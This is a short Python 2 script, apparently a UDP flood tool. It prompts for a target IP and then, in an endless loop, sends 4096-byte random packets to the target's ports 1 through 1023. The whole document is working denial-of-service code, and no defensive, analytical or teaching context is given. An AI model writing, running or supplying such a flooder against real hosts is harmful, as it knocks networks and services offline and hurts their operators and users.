import socket
import random
import sys
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes=random._urandom(4096)
ip=raw_input('Target IP: ')
#ip=sys.argv[1]
port=1
while 1:
    sock.sendto(bytes,(ip,port))
    #print(str(ip) + ' Target ' + str(port) + ' Port')
    port=port+1
    if port > 1023:
            port=1
